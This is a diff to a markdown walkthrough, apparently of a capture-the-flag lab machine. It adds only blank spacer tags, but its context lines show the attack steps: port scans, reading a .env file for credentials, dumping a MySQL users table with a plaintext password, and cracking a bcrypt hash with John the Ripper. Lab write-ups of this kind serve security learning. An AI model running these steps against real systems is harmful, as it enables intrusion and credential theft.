@@ -47,12 +47,18 @@ Start the Machine.
 ```shell
 nmap -p- --min-rate 5000 -Pn 10.129.46.72
 ```
+<div align="center">
+<br>
+</div>
 
 ## Targeted Scan
 
 ```shell
 nmap -A -p 22,80 10.129.46.72    
 ```
+<div align="center">
+<br>
+</div>
 
 ## Add vhost to hosts file
 
@@ -156,12 +162,18 @@ stty rows 50 columns 200
 ls -la /opt/
 cat /opt/DarkZero_Campaigns/.env
 ```
+<div align="center">
+<br>
+</div>
 
 ### Dump users table
 
 ```bash
 mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "SELECT * FROM users;"
 ```
+<div align="center">
+<br>
+</div>
 
 ### Crack josh 
 
@@ -171,6 +183,9 @@ mysql -u darkzero -p'C4ntFindMyDMpass!' -h localhost -D darkzero_campaigns -e "S
 echo 'josh:$2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK' > josh.hash
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt josh.hash
 ```
+<div align="center">
+<br>
+</div>
 
 ### SSH in
 
